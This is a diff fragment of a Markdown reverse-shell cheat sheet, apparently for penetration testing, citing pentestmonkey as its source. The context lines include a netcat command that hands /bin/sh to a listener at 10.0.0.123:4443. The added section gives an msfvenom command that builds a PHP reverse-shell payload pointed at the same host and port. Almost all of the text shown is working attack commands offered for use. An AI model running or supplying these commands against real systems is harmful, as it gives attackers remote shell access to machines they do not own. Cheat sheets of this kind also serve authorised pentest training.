@@ -35,6 +35,10 @@ p.waitFor()`
 
 `nc 10.0.0.123 4443 -e /bin/sh`
 
+## MSFVenom
+
+`$ msfvenom -p php/unix/cmd/reverse_python LHOST=10.0.0.123 LPORT=4443 -f raw -o /home/kali/reverse-shell.php`
+
 ## Fonte:
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
